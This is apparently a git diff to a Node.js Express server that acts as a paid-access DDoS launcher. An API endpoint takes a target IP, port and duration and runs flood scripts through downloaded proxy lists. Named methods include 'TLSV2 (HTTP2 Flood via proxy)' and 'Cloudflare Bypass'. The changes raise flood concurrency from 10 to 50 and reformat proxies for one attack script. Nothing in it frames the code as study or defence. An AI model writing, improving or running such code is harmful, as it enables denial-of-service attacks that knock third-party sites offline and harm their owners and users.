@@ -65,6 +65,13 @@ function verifyApiKey(req, res, next) {
     next();
 }
 
+// ==================== CLEAN PROXY FUNCTION ====================
+function cleanProxyUrl(proxy) {
+    // Remove http://, https://, socks4://, socks5:// prefixes
+    let cleanProxy = proxy.replace(/^(https?:\/\/|socks[45]:\/\/)/i, '');
+    return cleanProxy;
+}
+
 // ==================== PROXY DOWNLOAD ====================
 function downloadProxy() {
     return new Promise((resolve, reject) => {
@@ -85,25 +92,38 @@ async function updateProxies() {
         for (const line of lines) {
             if (!line.trim()) continue;
             let proxy = line.trim();
-            if (!proxy.includes('://')) {
-                proxy = `http://${proxy}`;
-            }
-            proxies.push(proxy);
+
+            // For TLSV2, clean the proxy (remove prefixes)
+            // We'll store clean proxies without prefixes
+            let cleanProxy = cleanProxyUrl(proxy);
+            proxies.push(cleanProxy);
         }
 
         const uniqueProxies = [...new Set(proxies)];
         fs.writeFileSync(PROXY_FILE, uniqueProxies.join('\n'));
-        console.log(`[PROXY] Loaded ${uniqueProxies.length} proxies`);
+        console.log(`[PROXY] Loaded ${uniqueProxies.length} clean proxies (prefixes removed)`);
         return uniqueProxies.length;
     } catch (err) {
         console.log(`[ERROR] Failed to download proxies: ${err.message}`);
         if (fs.existsSync(PROXY_FILE)) {
-            const proxies = fs.readFileSync(PROXY_FILE, 'utf8').split('\n').filter(p => p.trim());
-            console.log(`[PROXY] Using ${proxies.length} proxies from local file`);
+            let proxies = fs.readFileSync(PROXY_FILE, 'utf8').split('\n').filter(p => p.trim());
+            // Clean existing proxies in file as well
+            proxies = proxies.map(p => cleanProxyUrl(p));
+            fs.writeFileSync(PROXY_FILE, proxies.join('\n'));
+            console.log(`[PROXY] Using ${proxies.length} clean proxies from local file`);
             return proxies.length;
         }
         return 0;
     }
+}
+
+// Function to get clean proxies for TLSV2 specifically
+function getCleanProxiesForTLSV2() {
+    if (!fs.existsSync(PROXY_FILE)) return [];
+    let proxies = fs.readFileSync(PROXY_FILE, 'utf8').split('\n').filter(p => p.trim());
+    // Ensure all proxies are clean
+    proxies = proxies.map(p => cleanProxyUrl(p));
+    return proxies;
 }
 
 // ==================== CREATE DEFAULT UA.TXT ====================
@@ -183,7 +203,7 @@ app.get('/api', verifyApiKey, async (req, res) => {
         if (!fs.existsSync(scriptPath)) {
             return res.status(404).json({ error: 'TLS.js not found' });
         }
-        const concurrent = 10;
+        const concurrent = 50;
         command = `node ${scriptPath} ${ip} ${parsedPort} ${PROXY_FILE} ${concurrent} ${parsedTime}`;
 
         // Method TLSV2 (HTTP2 Flood via proxy with stable reconnect)
@@ -192,8 +212,17 @@ app.get('/api', verifyApiKey, async (req, res) => {
         if (!fs.existsSync(scriptPath)) {
             return res.status(404).json({ error: 'TLSV2.js not found' });
         }
+
+        // Get clean proxies specifically for TLSV2
+        const cleanProxies = getCleanProxiesForTLSV2();
+        const tempProxyFile = path.join(SCRIPTS_DIR, 'proxy_tlsv2_clean.txt');
+        fs.writeFileSync(tempProxyFile, cleanProxies.join('\n'));
+
         const rateParam = 50;
-        command = `node ${scriptPath} ${target} ${parsedTime} ${rateParam} ${parsedThreads} ${PROXY_FILE}`;
+        command = `node ${scriptPath} ${target} ${parsedTime} ${rateParam} ${parsedThreads} ${tempProxyFile}`;
+
+        console.log(`[TLSV2] Using clean proxies (without http://, https://, socks:// prefixes)`);
+        console.log(`[TLSV2] Sample clean proxy: ${cleanProxies[0] || 'none'}`);
 
         // Method CF (Cloudflare Bypass - HTTP2 with proxy)
     } else if (normalizedMethod === 'cf') {
@@ -284,7 +313,7 @@ app.get('/api', verifyApiKey, async (req, res) => {
 
 // ==================== HEALTH CHECK ====================
 app.get('/health', (req, res) => {
-    const proxyCount = fs.existsSync(PROXY_FILE) ? fs.readFileSync(PROXY_FILE, 'utf8').split('\n').filter(p => p.trim()).length : 0;
+    let proxyCount = fs.existsSync(PROXY_FILE) ? fs.readFileSync(PROXY_FILE, 'utf8').split('\n').filter(p => p.trim()).length : 0;
     res.json({
         status: 'running',
         port: PORT,
